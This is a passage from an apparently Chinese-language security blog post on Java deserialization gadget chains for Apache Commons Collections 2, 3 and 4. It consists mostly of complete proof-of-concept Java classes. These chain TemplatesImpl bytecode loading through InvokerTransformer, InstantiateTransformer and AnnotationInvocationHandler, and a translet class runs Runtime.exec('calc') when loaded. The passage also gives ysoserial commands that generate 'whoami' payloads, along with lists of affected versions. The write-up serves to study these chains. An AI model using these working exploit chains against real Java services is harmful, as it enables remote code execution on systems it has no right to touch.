class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br><br>        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templatesimpl);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        SetFieldValue(transformingComparator,<span class="hljs-string">&quot;transformer&quot;</span>,invokerTransformer);<br>        String s= serialize(priorityQueue);<br>        deserialize(s);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="commons-collection-3"><a class="markdownIt-Anchor" href="#commons-collection-3"></a> Commons Collection 3</h3><p>影响版本：jdk&lt;8u71 ，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections3 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">前半条链是CC1-&gt;T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><h4 id="invoketransformertransform"><a class="markdownIt-Anchor" href="#invoketransformertransform"></a> InvokeTransformer.transform</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">前半条链是CC1-&gt;I<span class="hljs-function"><span class="hljs-title">nvokeTransformer</span>.transform-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//        templatesimpl.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templatesimpl),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt; ();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class c= Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        Object object= constructor.newInstance(Retention.class,transformedMap);<br><span class="hljs-comment">//        serializeBase(object);</span><br>        deserialize(serializeBase(object));<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serializeBase</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ByteArrayOutputStream baos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodeBytes= Base64.getDecoder().decode(ser);<br>        ByteArrayInputStream data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodeBytes);<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(data);<br>        Object obj= ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="instantiatetransformertransform"><a class="markdownIt-Anchor" href="#instantiatetransformertransform"></a> InstantiateTransformer.transform</h4><p>ysoserial用的就是这个</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">前半条链是CC1-&gt;I<span class="hljs-function"><span class="hljs-title">nstantiateTransformer</span>.transform-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//        templatesimpl.newTransformer();</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesimpl&#125;);<br><span class="hljs-comment">//        instantiateTransformer.transform(TrAXFilter.class);</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt; ();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class c= Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        Object object= constructor.newInstance(Retention.class,transformedMap);<br>        serializeBase(object);<br>        deserialize(serializeBase(object));<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serializeBase</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ByteArrayOutputStream baos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodeBytes= Base64.getDecoder().decode(ser);<br>        ByteArrayInputStream data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodeBytes);<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(data);<br>        Object obj= ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="commons-collection-4"><a class="markdownIt-Anchor" href="#commons-collection-4"></a> Commons Collection 4</h3><p>影响版本：jdk无限制，CommonsCollections 4.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections4 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.readObject-&gt;</span>P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.heapify-&gt;</span>T<span class="hljs-function"><span class="hljs-title">ransformingComparator</span>.compare-&gt;</span>C<span class="hljs-function"><span class="hljs-title">hainedTransformer</span>.transform-&gt;</span>I<span class="hljs-function"><span class="hljs-title">nstantiateTransformer</span>.transform-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 